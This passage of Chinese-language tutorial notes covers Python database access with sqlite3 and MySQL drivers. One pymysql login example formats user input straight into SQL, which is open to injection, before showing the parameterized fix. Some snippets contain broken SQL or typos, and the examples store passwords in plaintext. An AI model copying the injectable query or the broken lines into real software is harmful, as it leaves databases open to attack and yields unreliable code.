    rows = cursor.fetchmany(3) # 每次抓取3条记录,该方法返回一个由3条记录组成的列表
    if not rows : break   # 如果抓取的rows为None,退出循环
    for r in rows:        # 再次使用循环遍历获取的列表
        print(r)          # ('1', 'Michael')
cursor.close()

conn.close()

conn = sqlite3.connect('test.db')
c = conn.cursor()
# 执行DDL语句创建数据表
c.execute('''create table user_tb(
    _id integer primary key autoincrement,
    name text,
    pass text,
    gender text)''')
# 执行DDL语句创建数据表
c.execute('''create table order_tb(
    _id integer primary key autoincrement,
    item_name text,
    item_price real,
    item_number real,
    user_id inteter,
    foreign key(user_id) references user_tb(_id) )''') # 外键列引用user_tb表的_id主键列
c.execute('insert into user_tb values(null, ?, ?, ?)', ('孙悟空', '123456', 'male'))
c.execute('insert into order_tb values(null, ?, ?, ?, ?)', ('鼠标', '34.2', '3', 1))
# 调用executemany()方法把同一条SQL语句执行多次
c.executemany('insert into user_tb values(null, ?, ?, ?)',
    (('sun', '123456', 'male'),
    ('bai', '123456', 'female'),
    ('zhu', '123456', 'male'),
    ('niu', '123456', 'male'),
    ('tang', '123456', 'male')))
# 可以使用executemany()重复执行update或delete语句,只要其第二个参数是一个序列,序列的每个元素都可对被执行SQL语句的参数赋值即可
c.executemany('update user_tb set name=? where _id=?',
    (('小孙', 2),
    ('小白', 3),
    ('小猪', 4),
    ('小牛', 5),
    ('小唐', 6)))
# 通过rowcount获取被修改的记录条数
print('修改的记录条数:', c.rowcount)
conn.commit()
c.close()
conn.close()

# 使用executescript()方法执行一段SQL脚本
conn = sqlite3.connect('test.db')
cursor = conn.cursor()
cursor.executescript('''
    insert into user_tb values(null, '武松', '3444', 'male');
    insert into user_tb values(null, '林冲', '44444', 'male');
    create table item_tb(_id integer primary key autoincrement, name, price);
    ''')
conn.commit()
cursor.close()
conn.close()

</textarea><pre>
在Python中操作数据库时,要先导入数据库对应的驱动,然后通过Connection对象和Cursor对象操作数据。
要确保打开的Connection对象和Cursor对象都正确地被关闭,否则资源就会泄露,try:...except:...finally:...确保出错的情况下也关闭掉Connection对象和Cursor对象

使用Cursor对象执行insert,update,delete语句时,执行结果由rowcount返回影响的行数,就可以拿到执行结果。
使用Cursor对象执行select语句时,通过featchall()可以拿到结果集,结果集是一个list,每个元素都是一个tuple,对应一行记录。

如果SQL语句带有参数则需要把参数按照位置传递给execute()方法,有几个问号占位符就必须对应几个参数
cursor.execute('select * from user where name=? and pwd=?', ('abc', 'password'))

</pre><textarea>
# 获得sqlite数据库中所有表的列表
cursor.execute('SELECT name FROM sqlite_master WHERE type="table" ORDER BY name')
values = cursor.fetchall()
print(values)

cursor.execute('SELECT * FROM user')
values = cursor.fetchall()
print(values)

# 查询出某个表的所有字段信息
cursor.execute('PRAGMA table_info(user)')
values = cursor.fetchall()
print(values)

</textarea><pre>
【 Python SQLite create_function方法:注册自定义函数 】
数据库连接对象还提供了一个create_function(name, num_params, func)方法,该方法用于注册一个自定义函数,接下来程序就可以在SQL语句中使用该自定义函数:

create_function方法包含3个参数:
name:指定注册的自定义函数的名字。
num_params:指定自定义函数所需参数的个数。
func:指定自定义函数对应的函数

</pre><textarea>
# 导入访问SQLite的模块
import sqlite3
# 先定义一个普通函数,准备注册为SQL中的自定义函数,该函数用于模拟一个简单的加密功能:程序会对字符串反转,并在字符串前后添加方括号
def reverse_ext(st):
    return '[' + st[::-1] + ']'  # 对字符串反转,前后加方括号

# 打开或创建数据库,也可以使用特殊名::memory:代表创建内存中的数据库
conn = sqlite3.connect('first.db')
# 调用create_function注册自定义函数:enc
conn.create_function('enc', 1, reverse_ext)
c = conn.cursor()
# 在SQL语句中使用enc自定义函数
c.execute('insert into user_tb values(null, ?, enc(?), ?)', ('贾宝玉', '123456', 'male'))
conn.commit()
c.close()
conn.close()

</textarea><pre>
【 Python SQLite create_aggregate方法:自定义聚集函数 】
标准的 SQL 语句提供了如下 5 个标准的聚集函数:
sum():统计总和。
avg():统计平均值。
count():统计记录条数。
max():统计最大值。
min():统计最小值。

如果程序需要在SQL语句中使用与其他业务相关的聚集函数,则可使用数据库连接对象所提供的create_aggregate(name, num_params, aggregate_class)方法,该方法用于注册一个自定义的聚集函数。

程序使用create_aggregate()方法为SQL语句注册一个自定义的聚集函数,然后程序就可以在SQL语句中使用该自定义的聚集函数

create_aggregate方法包含3个参数:
name:指定自定义聚集函数的名字。
num_params:指定聚集函数所需的参数。
aggregate_class:指定聚集函数的实现类。该类必须实现step(self, params...)和finalize(self)方法,其中step()方法对于查询所返回的每条记录各执行一次;finalize(self)方法只在最后执行一次,该方法的返回值将作为聚集函数最后的返回值

</pre>假设需要查询user_tb表中长度最短的密码,此时就需要用到自定义的聚集函数<textarea>
import sqlite3

# 先定义一个普通类,准备注册为SQL中的自定义聚集函数
class MinLen:
    def __init__(self):
        self.min_len = None
    def step(self, value):
        # 如果self.min_len还未赋值,直接将当前value赋值给self.min_lin
        if self.min_len is None :
            self.min_len = value
            return
        # 找到一个长度更短的value,用value代替self.min_len
        if len(self.min_len) > len(value):
            self.min_len = value
    def finalize(self):
        return self.min_len

conn = sqlite3.connect('first.db')
# 调用create_aggregate注册自定义聚集函数:min_len
conn.create_aggregate('min_len', 1, MinLen)
c = conn.cursor()
# 在SQL语句中使用min_len自定义聚集函数
c.execute('select min_len(pass) from user_tb')
print(c.fetchone()[0])
conn.commit()
c.close()
conn.close()

</textarea><pre>
【 Python SQLite create_collation方法:创建自定义比较函数 】
在标准的SQL语句中提供了一个order by子句,该子句用于对查询结果进行排序,但这种排序只会按默认的排序规则进行,如果程序需要按业务相关规则进行排序,则需要创建自定义的比较函数。

如果程序需要在SQL语句中使用与业务相关的比较函数,则可使用数据库连接对象所提供的create_collation(name, callable)方法注册一个自定义的比较函数。

create_collation方法包含两个参数:
name:指定自定义比较函数的名字。
callable:指定自定义比较函数对应的函数。该函数包含两个参数,并对这两个参数进行大小比较,如果该方法返回正整数,系统认为第一个参数更大;如果返回负整数,系统认为第二个参数更大;如果返回0,系统认为两个参数相等。callable函数的参数以Python(bytes)字节串的形式传入,因此系统默认会以UTF-8字符集将字符串编码成字节串后传入callable函数。

</pre>对user_tb表中的pass进行排序,但pass列前面采用了加密:第一个字符和最后一个字符都是方括号,因此程序会对pass列去掉前后两个方括号之后再进行排序。所以程序需要自定义比较函数,该函数将会把字符串的第一个字符和最后一个字符去掉后比较大小<textarea>
import sqlite3

# 去掉字符串第一个、最后一个字符后比较大小
def my_collate(st1, st2):
    if st1[1: -1] == st2[1: -1]:
        return 0
    elif st1[1: -1] > st2[1: -1]:
        return 1
    else:
        return -1

conn = sqlite3.connect('first.db')
# 调用create_collation注册自定义比较函数:sub_cmp
conn.create_collation('sub_cmp', my_collate)
c = conn.cursor()
c.execute('select * from user_tb order by pass collate sub_cmp')
# 采用for循环遍历游标,游标本身是可迭代对象,因此程序不需要使用fetchone()来逐行获取查询结果,而是直接使用for循环来遍历游标获取查询结果集
for row in c: print(row)
conn.commit()
c.close()
conn.close()

</textarea><pre>
【 SQLite Expert安装和使用 】
可以通过SQLite Expert工具对SQLite数据库进行查看和管理

安装SQLite Expert工具:
登录http://www.sqliteexpert.com/download.html站点来下载SQLite Expert,选择免费的个人版。将页面滚动到下方,找到"SQLite Expert Personal 5.x",然后单击下方的链接,64位操作系统选择64bit版,32位操作系统选择32bit版,下载SQLiteExpertPersSetup64.exe文件完成后单击该文件开始安装,其安装过程和安装普通的Windows软件完全相同。

</pre>

<h4>sqlite3命令行工具</h4><pre>
SQLite是遵守ACID的关系数据库管理系统,它包含在一个相对小的C程序库中。
与许多其它数据库管理系统不同,SQLite不是一个客户端/服务器结构的数据库引擎,而是被集成在用户程序中

SQLite是一个软件库,是一个进程内的库,实现了自给自足的、无服务器的、零配置的、事务性的SQL数据库引擎。SQLite是在世界上最广泛部署的SQL数据库引擎。SQLite源代码不受版权限制
就像其他数据库,SQLite引擎不是一个独立的进程,可以按应用程序需求进行静态或动态连接。SQLite直接访问其存储文件

【 SQLite命令 】
命令包括CREATE、SELECT、INSERT、UPDATE、DELETE和DROP
DDL - 数据定义语言
CREATE  创建一个新的表,一个表的视图,或者数据库中的其他对象。
ALTER   修改数据库中的某个已有的数据库对象,比如一个表。
DROP    删除整个表,或者表的视图,或者数据库中的其他对象。

DML - 数据操作语言
INSERT  创建一条记录。
UPDATE  修改记录。
DELETE  删除记录。

DQL - 数据查询语言
SELECT  从一个或多个表中检索某些记录。

【 SQLite支持的数据类型 】
NULL 值为NULL
INTEGER 值为带符号的整型,根据类别用1,2,3,4,6,8字节存储
REAL 值为浮点型,8字节存储
TEXT 值为text字符串,使用数据库编码(UTF-8, UTF-16BE or UTF-16-LE)存储
BLOB 值为二进制数据,具体看实际输入

但实际上sqlite3也接受如下的数据类型：
smallint  16 位元的整数
interger 32 位元的整数
decimal(p,s)  p精确值和s大小的十进位整数,p指全部有几个数(digits)大小值,s指小数点後有几位数。如果没有特别指定则系统会设为p=5; s=0
float 32位元的实数。
double 64位元的实数。
char(n) n长度的字串,n不能超过254。
varchar(n) 长度不固定且其最大长度为n的字串,n不能超过4000。
graphic(n) 和char(n)一样,不过其单位是两个字元double-bytes, n不能超过127。这个形态是为了支援两个字元长度的字体,例如中文字。
vargraphic(n)  可变长度且其最大长度为 n 的双字元字串,n不能超过 2000。
date 包含了 年份、月份、日期。
time 包含了 小时、分钟、秒。
timestamp 包含了 年、月、日、时、分、秒、千分之一秒。

如果将声明表的一列设置为INTEGER PRIMARY KEY,则具有：
1．每当你在该列上插入一NULL值时,NULL自动被转换为一个比该列中最大值大1的一个整数;
2．如果表是空的,将会是1;

【 sqlite函数 】
算术函数
abs(X)返回给定数字表达式的绝对值。
max(X,Y[,...])返回表达式的最大值。
min(X,Y[,...])返回表达式的最小值。
random(*)返回随机数。
round(X[,Y])返回数字表达式并四舍五入为指定的长度或精度。

字符处理函数
length(X)返回给定字符串表达式的字符个数。
lower(X)将大写字符数据转换为小写字符数据后返回字符表达式。
upper(X)返回将小写字符数据转换为大写的字符表达式。
substr(X,Y,Z)返回表达式的一部分。
randstr()
quote(A)
like(A,B)

确定给定的字符串是否与指定的模式匹配。
glob(A,B)

条件判断函数
coalesce(X,Y[,...])
ifnull(X,Y)
nullif(X,Y)

集合函数
avg(X)返回组中值的平均值。
count(X)返回组中项目的数量。
max(X)返回组中值的最大值。
min(X)返回组中值的最小值。
sum(X)返回表达式中所有值的和。

其他函数
typeof(X)返回数据的类型。
last_insert_rowid()返回最后插入的数据的 ID 。
sqlite_version(*)返回 SQLite 的版本。
change_count()返回受上一语句影响的行数。
last_statement_change_count()

【 sqlite3命令的安装和使用 】
sudo apt install sqlite3

进入sqlite3命令行
sqlite3 /path/to/dbname
sqlite3 ~/Downloads/django_test/cmdb/db.sqlite3

创建一个新数据库和打开一个已经存在的数据库命令是一样的,如果文件在当前目录下不存在则新建,如果存在则打开
创建一个新的数据库：sqlite3 test.db
打开一个已经存在的数据库：sqlite3 已经存在的文件

【 点命令 】
SQLite的点命令的不同之处在于它们不以分号结束
如需获取可用的点命令的清单,可以在任何时候输入 ".help"

sqlite>.help
.help 显示消息。

.databases 列出数据库的名称及其所依附的文件,如main: /mnt/e/wamp64/www/study/python/mysite/db.sqlite3
.database 显示当前打开的数据库文的位置
.tables  查看所有表
.tables ?PATTERN? 列出匹配LIKE模式的表的名称。
.indices ?TABLE? 显示所有索引的名称。如果指定了TABLE表则只显示匹配LIKE模式的TABLE表的索引。
.schema 显示数据表结构
.schema ?TABLE? 显示CREATE语句。如果指定了TABLE表则只显示匹配LIKE模式的TABLE表。

.backup ?DB? FILE 备份DB数据库(默认是"main")到FILE文件
.import FILE TABLE 导入来自FILE文件的数据到TABLE表中。
.read FILENAME  执行FILENAME文件中的SQL
.dump ?TABLE? 以SQL文本格式转储数据库,如果指定了TABLE表则只转储匹配LIKE模式的TABLE表。

.show 显示各种设置的当前值。
.echo ON|OFF 开启或关闭echo命令。
.explain ON|OFF 开启或关闭适合于EXPLAIN的输出模式。如果没有带参数则为EXPLAIN on,及开启EXPLAIN。
.header(s) ON|OFF 开启或关闭头部显示。
.mode MODE  设置输出模式,MODE可以是下列之一:csv(逗号分隔的值)、column(左对齐的列)、html(HTML的table代码)、insert(TABLE表的SQL插入(insert)语句)、line(每行一个值)、list(由.separator字符串分隔的值)、tabs(由Tab分隔的值)、tcl(TCL列表元素)、
.nullvalue STRING 在NULL值的地方输出STRING字符串。
.output FILENAME 发送输出到FILENAME文件。
.output stdout 发送输出到屏幕。
.log FILE|off 开启或关闭日志。FILE文件可以是stderr(标准错误)/stdout(标准输出)。
.separator STRING 改变输出模式和.import所使用的分隔符。
.bail ON|OFF 遇到错误时不再继续,默为OFF
.width NUM NUM为"column"模式设置列宽度。
.stats ON|OFF 开启或关闭统计。
.timer ON|OFF 开启或关闭CPU定时器。

.timeout MS 尝试打开锁定的表MS毫秒。
.load FILE ?ENTRY?  加载一个扩展库。
.print STRING... 逐字地输出STRING字符串。
.prompt MAIN CONTINUE 替换标准提示符。

.exit 退出SQLite提示符。
.quit 退出SQLite提示符。

使用.show命令来查看SQLite命令提示符的默认设置。
sqlite>.show
     echo: off
  explain: off
  headers: off
     mode: column
nullvalue: ""
   output: stdout
separator: "|"
    width:
sqlite>

格式化输出
sqlite>.header on    # 输出字段名
sqlite>.mode column
sqlite>.timer on     # 输出执行时间
sqlite> SELECT * FROM COMPANY;
ID          NAME        AGE         ADDRESS     SALARY
----------  ----------  ----------  ----------  ----------
1           Paul        32          California  20000.0
2           Allen       25          Texas       15000.0
3           Teddy       23          Norway      20000.0
Run Time: real 0.002 user 0.000000 sys 0.000000

【 sqlite_master表格 】
SQLite数据库的框架被保存在一个名叫"sqlite_master"的特殊的表中,可以像查询其它表一样通过执行"SELECT"查询这个特殊的表
不能在sqlite_master表中执行诸如DROP TABLE, UPDATE, INSERT或DELETE命令。sqlite_master表在创建、删除和索引数据库时自动更新这个表,不能手工更改sqlite_master表。

主表中保存数据库表的关键信息,并把它命名为sqlite_master。如要查看表概要,可按如下操作:
sqlite>.schema sqlite_master
CREATE TABLE sqlite_master (
  type text,
  name text,
  tbl_name text,
  rootpage integer,
  sql text
);

对于表来说,type字段永远是'table',name字段永远是表的名字。所以要获得数据库中所有表的列表,使用下列SELECT语句：
SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;

对于索引,type 等于 'index', name 则是索引的名字,tbl_name 是该索引所属的表的名字。不管是表还是索引,sql 字段是原先用 CREATE TABLE 或 CREATE INDEX 语句创建它们时的命令文本。对于自动创建的索引(用来实现 PRIMARY KEY 或 UNIQUE 约束),sql字段为NULL。

【 注释 】
SQLite注释是附加的注释,可以在SQLite代码中添加注释以增加其可读性,他们可以出现在任何空白处,包括在表达式内和其他SQL语句的中间,但它们不能嵌套。
SQL注释以两个连续的 "-" 字符(ASCII 0x2d)开始,并扩展至下一个换行符(ASCII 0x0a)或直到输入结束,以先到者为准。
也可以使用C风格的注释,以 "/*" 开始并扩展至下一个 "*/" 字符对或直到输入结束,以先到者为准。SQLite的注释可以跨越多行。
sqlite>.help -- 这是一个简单的注释

【 SQLite语句 】
所有的SQLite语句可以以任何关键字开始,如SELECT、INSERT、UPDATE、DELETE、ALTER、DROP等,所有的语句以分号结束

【 select语句 】
SELECT语句:
SELECT column1, column2....columnN FROM table_name;

日期和时间
select datetime('now');

日期
select date('now');

时间
select time('now');

查询sqlite版本
select sqlite_version();

执行多条查询语句
sqlite> select
   ...> (select count(1) from ucloud_uhost) as uhost,
   ...> (select count(1) from ucloud_project) as project,
   ...> (select count(1) from ucloud_region) as region

WHERE子句:
SELECT column1, column2....columnN FROM table_name WHERE  CONDITION;

AND/OR子句:
SELECT column1, column2....columnN FROM table_name WHERE  CONDITION-1 {AND|OR} CONDITION-2;

BETWEEN子句:
SELECT column1, column2....columnN FROM table_name WHERE column_name BETWEEN val-1 AND val-2;

IN子句:
SELECT column1, column2....columnN FROM table_name WHERE column_name IN (val-1, val-2,...val-N);

Like子句:
SELECT column1, column2....columnN FROM table_name WHERE column_name LIKE { PATTERN };

NOT IN子句:
SELECT column1, column2....columnN FROM table_name WHERE column_name NOT IN (val-1, val-2,...val-N);

EXISTS子句:
SELECT column1, column2....columnN FROM table_name WHERE column_name EXISTS (SELECT * FROM   table_name );

DISTINCT子句:
SELECT DISTINCT column1, column2....columnN FROM table_name;

COUNT子句:
SELECT COUNT(column_name) FROM table_name WHERE CONDITION;
sqlite> select count() from ucloud_zone;  查询表中总的数据条目数

ORDER BY子句:
SELECT column1, column2....columnN FROM  table_name WHERE CONDITION ORDER BY column_name {ASC|DESC};

GROUP BY子句:
SELECT SUM(column_name) FROM table_name WHERE CONDITION GROUP BY column_name;

HAVING子句:
SELECT SUM(column_name) FROM table_name WHERE CONDITION GROUP BY column_name HAVING (arithematic function condition);

总数：select count(*) from table1;
求和：select sum(field1) from table1;
平均：select avg(field1) from table1;
最大：select max(field1) from table1;
最小：select min(field1) from table1;
排序：select 字段 from table1 order by 字段(desc或asc);
分组：select 字段 from table1 group by 字段,字段…;
限制输出:select 字段 from table1 limit x offset y;
限制输出:select 字段 from table1 limit y , x

【 EXPLAIN语句 】
EXPLAIN INSERT statement...;
EXPLAIN QUERY PLAN SELECT statement...;

【 表操作 】
CREATE TABLE语句:
CREATE TABLE table_name(
   column1 datatype,
   column2 datatype,
   column3 datatype,
   .....
   columnN datatype,
   PRIMARY KEY( one or more columns )
);
CREATE TABLE Books(Id integer PRIMARY KEY, Title text, Author text, Isbn text default 'not available');
create table people(NAME,SEX,AGE);

create table if not exists student(id integer primary key autoincrement,/
age smallint ,anchor smallint);

DROP TABLE语句:
DROP TABLE database_name.table_name;

INSERT INTO语句:
INSERT INTO table_name( column1, column2....columnN) VALUES ( value1, value2....valueN);
INSERT INTO Books VALUES(1, 'War and Peace', 'Leo Tolstoy', '978-0345472403');
INSERT INTO Books VALUES(2, 'The Brothers Karamazov', 'Fyodor Dostoyevsky', '978-0486437910');
INSERT INTO Books VALUES(3, 'Crime and Punishment',  'Fyodor Dostoyevsky', '978-1840224306');

或者将以上sql命令保存在文件中,使用.read *.sql进行导入
BEGIN TRANSACTION;
CREATE TABLE Books(Id integer PRIMARY KEY, Title text, Author text, Isbn text default 'not available');
INSERT INTO Books VALUES(1, 'War and Peace', 'Leo Tolstoy', '978-0345472403');
INSERT INTO Books VALUES(2, 'The Brothers Karamazov', 'Fyodor Dostoyevsky', '978-0486437910');
INSERT INTO Books VALUES(3, 'Crime and Punishment',  'Fyodor Dostoyevsky', '978-1840224306');
COMMIT;

批量插入
Insert into SAMPLE(PRJNUM, PRJNAME, EMYNUM, EMYNAME, SALCATEGORY, SALPACKAGE)
values(100001, 'TPMS', 200001, 'Johnson', 'A', 2000), (100001, 'TPMS', 200002,
'Christine', 'B', 3000), (100001, 'TPMS', 200003, 'Kevin', 'C', 4000), (100002,
'TCT', 200001, 'Johnson', 'A', 2000), (100002, 'TCT', 200004, 'Apple', 'B',
3000);

UPDATE语句:
UPDATE table_name SET column1 = value1, column2 = value2....columnN=valueN [ WHERE  CONDITION ];

DELETE语句:
DELETE FROM table_name WHERE {CONDITION};

【 ALTER语句 】
ALTER TABLE语句:
ALTER TABLE table_name ADD COLUMN column_def...;

ALTER TABLE语句(Rename):
ALTER TABLE table_name RENAME TO new_table_name;

【 索引操作 】
create [unique] index 索引名 on 表名(col….);

CREATE INDEX语句:
CREATE INDEX index_name ON table_name ( column_name COLLATE NOCASE );

DROP INDEX语句:
DROP INDEX database_name.index_name;

CREATE UNIQUE INDEX语句:
CREATE UNIQUE INDEX index_name ON table_name ( column1, column2,...columnN);

【 事务 】
BEGIN TRANSACTION语句:
BEGIN;
BEGIN EXCLUSIVE TRANSACTION;

COMMIT语句:
COMMIT;

COMMIT TRANSACTION语句:
COMMIT;

ROLLBACK语句:
ROLLBACK;
ROLLBACK TO SAVEPOINT savepoint_name;

成批操作的时候,启动事务比不启动事务快n倍
开始事务处理
BEGIN  TRANSACTION;
…………..
进行对数据库操作
…………..
事务提交
COMMIT;

具体事例如下:
假设有一个t1表,其中有"a", "b", "c"三列, 如果要删除列c ,以下过程描述如何做:
BEGIN TRANSACTION;
CREATE TEMPORARY TABLE t1_backup(a,b);
INSERT INTO t1_backup SELECT a,b FROM t1;
DROP TABLE t1;
CREATE TABLE t1(a,b);
INSERT INTO t1 SELECT a,b FROM t1_backup;
DROP TABLE t1_backup;
COMMIT;

【 其他 】
CREATE TRIGGER语句:
CREATE TRIGGER database_name.trigger_name
BEFORE INSERT ON table_name FOR EACH ROW
BEGIN
   stmt1;
   stmt2;
   ....
END;

DROP TRIGGER语句:
DROP TRIGGER trigger_name

CREATE VIEW语句:
CREATE VIEW database_name.view_name AS SELECT statement....;

DROP VIEW语句:
DROP VIEW view_name;

CREATE VIRTUAL TABLE语句:
CREATE VIRTUAL TABLE database_name.table_name USING weblog( access.log );
CREATE VIRTUAL TABLE database_name.table_name USING fts3( );

DETACH DATABASE语句:
DETACH DATABASE 'Alias-Name';

GLOB子句:
SELECT column1, column2....columnN FROM table_name WHERE  column_name GLOB { PATTERN };

PRAGMA语句:
PRAGMA pragma_name;
For example:
PRAGMA page_size;
PRAGMA cache_size = 1024;
PRAGMA table_info(table_name);

RELEASE SAVEPOINT语句:
RELEASE savepoint_name;

REINDEX语句:
REINDEX collation_name;
REINDEX database_name.index_name;
REINDEX database_name.table_name;

SAVEPOINT语句:
SAVEPOINT savepoint_name;

VACUUM语句:
VACUUM;

ATTACH DATABASE语句:
ATTACH DATABASE 'DatabaseName' As 'Alias-Name';

ANALYZE语句:
ANALYZE;
or
ANALYZE database_name;
or
ANALYZE database_name.table_name;

</pre>
</div>

<div id="mysql">
<h4>mysql</h4><pre>
使用Python的DB API 2.0来操作MySQL数据库与操作SQLite数据库并没有太大的区别,因为遵循的是相同的DB API 2.0规范
windows安装mysql时选择安装MySQL服务器、文档和Connector/Python,这就是Python连MySQL的模块

【 安装MySQL驱动 】
MySQLdb是用于Python链接Mysql数据库的接口,它实现了Python数据库API规范V2.0,基于MySQL C API上建立的

由于MySQL服务器以独立的进程运行,并通过网络对外服务,所以需要支持Python的MySQL驱动来连接到MySQL服务器。MySQL官方提供了mysql-connector-python驱动
$ pip3 show mysql-connector-python     # 查看是否已经安装了mysql-connector-python
$ pip3 install mysql-connector-python
$ pip3 install mysql-connector         # 如果上面的命令安装失败可以试试另一个驱动

create database python default character set utf8 collate utf8_general_ci

由于Python的DB-API定义都是通用的,所以操作MySQL的数据库代码和SQLite类似
执行INSERT等操作后要调用commit()提交事务

</pre>连接到MySQL服务器的test数据库<textarea>
# 导入MySQL驱动:
import mysql.connector
conn = mysql.connector.connect(user='admin', password='', database='python')
cursor = conn.cursor()
# 创建user表:
cursor.execute('create table user (id varchar(20) primary key, name varchar(20))')
# 插入一行记录,MySQL的占位符是%s:
cursor.execute('insert into user (id, name) values (%s, %s)', ['1', 'Michael'])
print(cursor.rowcount)   # 1
# 提交事务:
conn.commit()
cursor.close()

# 运行查询:
cursor = conn.cursor()
cursor.execute('select * from user where id = %s', ('1',))
values = cursor.fetchall()
print(values)    # [('1', 'Michael')]
cursor.close()

# 关闭Connection
conn.close()

</textarea><textarea>
conn = mysql.connector.connect(host='10.214.168.25',port=3306,user='user',password='password',database='test')
    cursor = conn.cursor()
    cursor.execute('select * from test t limit 2')
    result = cursor.fetchall()
    if result:
        print(len(result))
        for r in result:
            print(r)
    else:
        print("result is %" % result)

</textarea><textarea>
config = {
    'host': '10.214.168.25',
    'user': 'user',
    'password': 'password',
    'port': 3306,
    'database': 'test',
    'charset': 'utf8'
}

conn = mysql.connector.connect(**config)
cursor = conn.cursor()
cursor.execute("select * from test t limit 2")
result = cursor.fetchall()
if result:
    print(len(result))
    for r in result:
        print(r)
else:
    print("result is %" % result)

</textarea><textarea>
cursor.execute('select * from test t where uuid = %s', ('00262732-d108-4a20-8af6-d1b4c3c4db6d',))
    result = cursor.fetchall()
    if result:
        print("result len is %s, result type is %s" % (len(result), type(result)))
        for r in result:
            print(r)
            for item in r:
                print("item is %s, item type is %s" % (item, type(item)))
    else:
        print("result is %" % result)

</textarea>

<h4>mysqlclient</h4><pre>
mysqlclient是Python3版本的MySQLdb,是一个C扩展模块,mysqlclient的性能比pymysql好,是Django ORM的依赖工具

pip3 install mysqlclient

ubuntu安装报错：mysql_config not found
解决：要先安装另外两个库
wget libmysqlclient-dev_8.0.11-lubuntu16.04_amd64.deb # 从mysql官网查找对应版本的库
dpkg -i libmysqlclient-dev_8.0.11-lubuntu16.04_amd64.deb
apt-get update
apt-get install libmysqlclient-dev python3.6-dev libssl-dev

</pre><textarea>
import MySQLdb
import time

connection = MySQLdb.connect(host='localhost', user='admin', db='python')
c = connection.cursor()

start_time = time.time()
c.execute("select * from user;")
res = c.fetchall()
print("time: {time} ".format(time = time.time()-start_time))

</textarea>

<h4>pymysql</h4><pre>
pip3 install pymysql
PyMySQL是在Python3.x版本中用于连接MySQL服务器的一个库,Python2中是使用mysqldb
PyMySQL是纯Python实现的驱动,速度上比不上MySQLdb,最大的特点就是安装方式没那么繁琐,同时兼容MySQL-python

在使用mysql-connector-python模块操作MySQL数据库之前先检查一下该模块的全局属性
>>> import pymysql
>>> pymysql.apilevel # '2.0'
>>> pymysql.paramstyle # 'pyformat'

</pre><textarea>
# 导入pymysql模块
import pymysql

# 连接database
conn = pymysql.connect(
    host = "数据库地址",
    user = "用户名",
    password = "密码",
    database = "数据库名",
    charset = "utf8"
)

# 得到一个可以执行SQL语句的光标对象,执行完毕返回的结果集默认以元组显示
cursor = conn.cursor()
# 得到一个可以执行SQL语句并且将结果作为字典返回的游标
#cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)

# 定义要执行的SQL语句
sql = """
CREATE TABLE USER1 (
id INT auto_increment PRIMARY KEY ,
name CHAR(10) NOT NULL UNIQUE,
age TINYINT NOT NULL
)ENGINE=innodb DEFAULT CHARSET=utf8;  #注意:charset='utf8' 不能写成utf-8
"""

# 执行SQL语句
cursor.execute(sql)

# 关闭光标对象
cursor.close()

# 关闭数据库连接
conn.close()

</textarea>使用with<textarea>
CREATE TABLE `users` (
    `id` int(11) NOT NULL AUTO_INCREMENT,
    `email` varchar(255) COLLATE utf8_bin NOT NULL,
    `password` varchar(255) COLLATE utf8_bin NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin
AUTO_INCREMENT=1 ;

import pymysql.cursors

# Connect to the database
connection = pymysql.connect(
    host='localhost',
    user='user',
    password='passwd',
    db='db',
    charset='utf8mb4',
    cursorclass=pymysql.cursors.DictCursor
)

try:
    with connection.cursor() as cursor:
        sql = "INSERT INTO `users` (`email`, `password`) VALUES (%s, %s)"
        cursor.execute(sql, ('webmaster@python.org', 'very-secret'))

    # connection is not autocommit by default. So you must commit to save your changes.
    connection.commit()

    with connection.cursor() as cursor:
        sql = "SELECT `id`, `password` FROM `users` WHERE `email`=%s"
        cursor.execute(sql, ('webmaster@python.org',))
        result = cursor.fetchone()
        print(result)
finally:
    connection.close()

This example will print:
{'password': 'very-secret', 'id': 1}

</textarea>封装with<textarea>
from pymysql import connect

class Mydb(object):
    def __init__(self, host, user, password, db, port=3306, charset='utf-8'):
        self.conn = connect(host=host, user=user, password=password, db=db, port=port, charset=charset)
        self.cur = self.conn.cursor()

    def __enter__(self):
        return self.cur

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.commit()
        self.cur.close()
        self.conn.close()

def main():
    with Mydb('127.0.0.1', 'admin', '', 'python') as cur:
        cur.execute('select * from user')
        all = cur.fetchall()
        print(all)

if __name__ == "__main__":
    main()

</textarea><textarea>
import pymysql

user = input('user>>: ').strip()
pwd = input('password>>: ').strip()

# 建立链接
conn = pymysql.connect(
    host = '192.168.0.103',
    port = 3306,
    user = 'root',
    password = '123',
    db = 'xing',
    charset = 'utf8'
)

# 拿到游标
cursor = conn.cursor()

# 执行sql语句
sql = 'select *fromuserinfo where user = "%s" and pwd="%s"' % (user, pwd)
print(sql)
res = cursor.execute(sql)
print(res)

# execute做字符串拼接,防止sql注入
sql = "select *fromuserinfo where name=%s and password=%s" # %s需要去掉引号,pymysql会自动加上
res = cursor.execute(sql,[user,pwd])

cursor.close()
conn.close()

# 进行判断
if res:
    print('登录成功')
else:
    print('登录失败')

</textarea>添加多条数据<textarea>
# 定义要执行的sql语句
sql = 'insert into userinfo(user,pwd) values(%s,%s);'
data = [
    ('july', '147'),
    ('june', '258'),
    ('marin', '369')
]
# 拼接并执行sql语句
cursor.executemany(sql, data)

# 涉及写操作要注意提交
conn.commit()

</textarea>插入单条数据<textarea>
sql ='insert into userinfo (user,pwd) values (%s,%s);'
name = 'wuli'
pwd = '123456789'
cursor.execute(sql, [name, pwd])
conn.commit()

</textarea>获取最新插入数据即最后一条<textarea>
# 定义将要执行的SQL语句
sql = "insert into userinfo (user, pwd) values (%s, %s);"
name = "wuli"
pwd = "123456789"
# 并执行SQL语句
cursor.execute(sql, [name, pwd])
# 涉及写操作注意要提交
conn.commit()
# 获取最新的那一条数据的ID
last_id = cursor.lastrowid
print("最后一条数据的ID是:", last_id)

</textarea>删除操作<textarea>
# 定义将要执行的SQL语句
sql = "deletefromuserinfo where user=%s;"
name = "june"
# 拼接并执行SQL语句
cursor.execute(sql, [name])
# 涉及写操作注意要提交
conn.commit()

</textarea>更改数据<textarea>
# 定义将要执行的SQL语句
sql = "update userinfo set pwd=%s where user=%s;"
# 拼接并执行SQL语句
cursor.execute(sql, ["july", "july"])
# 涉及写操作注意要提交
conn.commit()

</textarea><textarea>
import pymysql

conn = pymysql.connect (
    host='192.168.0.103',
    port=3306,
    user='root',
    password='123',
